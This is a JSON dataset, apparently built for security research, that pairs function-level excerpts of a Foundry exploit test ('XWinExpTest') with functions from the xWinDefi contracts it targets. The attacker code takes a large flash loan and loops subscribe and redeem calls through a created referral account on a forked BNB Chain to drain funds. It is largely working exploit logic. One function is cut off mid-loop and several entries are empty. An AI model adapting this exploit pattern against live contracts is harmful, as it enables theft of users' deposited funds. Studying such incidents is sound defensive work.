[
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {\n        require(address(this).balance == 76_000_000_000_000_000_000_000, \"error\");\n        SimpleAccount account1 = new SimpleAccount();\n        payable(address(account1)).call{value: 11}(\"\");\n        account1.subscribe();\n        for (uint256 i = 0; i < 20; i++) {\n            uint256 bnbbalance = address(this).balance;\n            TradeParams memory tradeParams = TradeParams({\n                xFundAddress: address(PCLPXWIN),\n                amount: bnbbalance,\n                priceImpactTolerance: 10_000,\n                deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,\n                returnInBase: false,\n                referral: address(account1)\n            });\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "redeem",
    "original_code": "    function redeem() public payable {\n        PCLPXWIN.approve(\n            address(xWinDefi), 1_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000\n        );\n        uint256 pclpxwinbalance = PCLPXWIN.balanceOf(address(this));\n        TradeParams memory tradeParams = TradeParams({\n            xFundAddress: address(PCLPXWIN),\n            amount: pclpxwinbalance,\n            priceImpactTolerance: 10_000,\n            deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,\n            returnInBase: false,\n            referral: 0x0000000000000000000000000000000000000000\n        });\n        xWinDefi.Redeem(tradeParams);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 8_589_725);\n        deal(address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "XWinExpTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        bank.flashloan(address(this), 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB, 76_000_000_000_000_000_000_000, \"\");\n        emit log_named_decimal_uint(\"Attacker BNB balance after exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IxWinDefi",
    "source_type": "victim_contract",
    "function_name": "Redeem",
    "original_code": "    function Redeem(\n        xWinLib.TradeParams memory _tradeParams,\n        address _investorAddress\n    ) external payable returns (uint256);\n        \n",
    "description": ""
  },
  {
    "contract/interface": "IxWinDefi",
    "source_type": "victim_contract",
    "function_name": "Subscribe",
    "original_code": "    function Subscribe(\n        xWinLib.TradeParams memory _tradeParams,\n        address _investorAddress\n    ) external payable returns (uint256);\n        \n",
    "description": ""
  },
  {
    "contract/interface": "IxWinDefi",
    "source_type": "victim_contract",
    "function_name": "WithdrawReward",
    "original_code": "    function WithdrawReward() external nonReentrant onlyNonEmergency payable {\n        \n        xWinLib.xWinReward storage _xwinReward =  xWinRewards[msg.sender];\n        uint256 rewardQty = GetEstimateReward(msg.sender);\n        require(rewardQty > 0, \"No reward\");\n        \n        _xwinReward.previousRealizedQty = 0;\n        _xwinReward.blockstart = block.number;\n        \n        uint amountWithdraw = (rewardRemaining >= rewardQty) ? rewardQty: rewardRemaining;\n        \n        if(amountWithdraw > 0) _sendRewards(msg.sender, amountWithdraw);\n        emit _WithdrawReward(msg.sender, amountWithdraw);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "SimpleAccount",
    "source_type": "victim_contract",
    "function_name": "subscribe",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SimpleAccount",
    "source_type": "victim_contract",
    "function_name": "withdrawRewards",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IBank",
    "source_type": "victim_contract",
    "function_name": "flashloan",
    "original_code": "",
    "description": ""
  }
]